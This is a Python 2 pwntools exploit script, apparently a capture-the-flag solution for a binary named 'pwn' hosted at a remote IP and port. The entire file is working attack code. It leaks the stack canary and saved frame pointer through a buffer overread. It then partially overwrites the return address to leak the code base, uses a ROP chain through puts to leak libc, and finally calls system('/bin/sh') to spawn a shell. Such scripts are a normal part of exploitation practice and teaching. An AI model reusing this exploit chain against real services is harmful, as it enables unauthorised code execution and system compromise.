#!/usr/bin/env python2

from pwn import *
from qpwn import *
context(os='linux', log_level='debug')
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if args.INFO:
    context.log_level = 'info'
    
DEBUG = not args.REMOTE and not args.TEST
if args.REMOTE:
    p = remote('114.116.54.89', 10000)
    libc = ELF('./libc.so.6')
elif args.TEST:
    p = process('./pwn', env={'LD_PRELOAD': './libc.so.6'})
    libc = ELF('./libc.so.6')
else:
    p = process('./pwn')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('./pwn')
init(p, elf, context, args)
make_alias(p)

if __name__ == '__main__':
    p.sla('  Please input the note path:\n', 'flag')
    #gogogo()
    #sleep(0.1)
    p.ru('  please input the note len:\n')
    p.sl(str(601))
    p.sa('please input the note:', 'a' * 601)
    p.ru('a' * 601)
    canary = '\x00' + p.r(7)
    old_rbp = u64(p.r(6).ljust(8, '\x00'))
    #gogogo()
    p.sa('so please input note(len is 624)', 'a' * 600 + canary + p64(old_rbp) + '\x45\x4c')
    #gogogo()
    p.sla('  please input the note len:', str(0x150))
    #gogogo()
    #bc(0x555555554d04)
    p.sa('please input the note:', 'a' * 0x150)
    p.ru('a' * 0x150)
    code_base = u64(p.r(6).ljust(8, '\x00')) - 0x970
    elf.address = code_base
    success('code ' + hex(code_base))
    p.sa('so please input note(len is 624)', flat('a' * 0x258, code_base + 0xc45))
    
    p.sla('  please input the note len:', str(0x258 + 0x8 * 6))
    pop_rdi_ret = code_base + 0x0000000000000e03
    ret = code_base + 0x0000000000000891
    #gogogo()
    p.sa('please input the note:', flat('a' * 0x258, pop_rdi_ret, elf.got['puts'], elf.plt['puts'], ret, code_base + 0xc45))
    puts_addr = u64(p.ru('\x7f')[-6:].ljust(8, '\x00'))
    success('puts ' + hex(puts_addr))
    libc.address = puts_addr - libc.sym['puts']
    #p.i()
    gogogo()
    p.sla('  please input the note len:', str(0x278 + 0x8 * 3))
    p.sa('please input the note:', flat('a' * 0x278, pop_rdi_ret, libc.search('/bin/sh').next(), libc.sym['system']))

    p.i()
    #p.sa('  please input the note len:\n', str(0x1000) + ' aaaaaaaaa\n')
